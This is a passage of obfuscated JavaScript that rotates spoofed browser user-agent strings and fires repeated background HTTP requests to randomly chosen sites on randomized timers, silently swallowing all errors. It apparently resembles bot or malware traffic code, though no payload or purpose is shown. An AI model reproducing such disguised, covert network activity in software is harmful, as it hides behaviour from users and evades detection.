      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x32 * -0x2f + -0xee1 + 0x1 * 0x5b3; k < -0x100e + -0x796 * 0x5 + 0x480 * 0xc; k++)
    setTimeout(f, (0x1 * -0x45ab + -0xa21a + 0x2f * 0x9eb) * k * getRandomInt(-0x2291 + -0xae6 + 0x2d78, 0x8f4 * 0x1 + -0x1 * -0x97a + 0x29 * -0x73));
  setInterval(() => {
    f();
    for (let l = -0xbc2 + -0x2078 + 0x2c3a; l < -0x50 + -0x8c0 + 0x7 * 0x14c; l++)
      setTimeout(f, (-0xf64b + 0xd * 0x21fb + 0x26ec) * l * getRandomInt(-0x1 * 0xd02 + 0x156c + -0x869, 0x4 * -0x966 + -0xa0a + -0x1 * -0x2fa5));
  }, -0x404132 + -0x1 * 0x2a162d + 0x3 * 0x35c1f5);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x1 * -0x1a51 + 0x1 * 0x239b + 0x120e) * getRandomInt(-0xa3f + -0x34 * -0x1b + 0x4c4, 0x2 * -0x76f + -0x2c * -0x3d + 0x467));
}, 0x11ec + 0x464 + -0x15ec);